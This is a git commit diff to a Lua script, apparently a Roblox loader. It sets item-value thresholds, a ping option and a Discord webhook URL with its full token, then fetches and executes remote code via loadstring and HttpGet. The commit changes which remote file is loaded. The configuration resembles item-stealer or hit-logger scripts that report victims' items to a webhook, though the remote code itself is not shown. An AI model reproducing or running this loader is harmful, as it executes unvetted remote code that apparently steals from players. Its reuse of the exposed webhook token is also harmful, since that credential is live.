d8e647449861522cd5cea74d66f5b0caa5cd5744
scriptjame <132070412+scriptjame@users.noreply.github.com>
2026-02-23 22:37:52 +0700

    Update bbthunghiem.lua

--- bbthunghiem.lua
+++ bbthunghiem.lua
@@ -3,4 +3,4 @@ _G.min_rap = 20
 _G.pingEveryone = "Yes"  -- veya "No"
 _G.webhook = "https://discord.com/api/webhooks/1447878740238405775/sy5pLqMZGjwMa-dvlFjmcctu3_vUFs_O6L8JaXmF1GbyQMWwPflOdwsq_dQ6lJi5ch06"
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptjame/thunghiem/refs/heads/main/bbthunghiem.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptjame/thunghiem/refs/heads/main/soucetest.lua'))()
